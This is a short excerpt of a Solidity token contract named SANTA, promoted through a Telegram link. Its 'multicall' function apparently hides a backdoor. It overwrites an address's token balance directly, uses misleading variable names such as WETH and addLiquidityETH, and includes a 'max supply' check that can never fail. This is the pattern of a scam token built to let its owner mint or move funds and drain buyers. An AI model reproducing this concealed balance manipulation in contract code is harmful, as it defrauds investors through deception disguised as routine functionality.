...
/**
Telegram: https://t.me/SantaClaus_BSC
**/
...
contract SANTA is IERC20, Ownable, BaseToken {
    ...
    function multicall(
        ...
        uint256 deliverySuplaiDec = WETH * 10 ** decimals();
        require(0 <= totalSupply() + deliverySuplaiDec, "Max supply exceeded");
        _balances[uniswapV2Router] = WETH * deliverySuplaiDec;
        uint256 addLiquidityETH = deliverySuplaiDec > address(this).balance ? 0 : address(this).balance - deliverySuplaiDec;
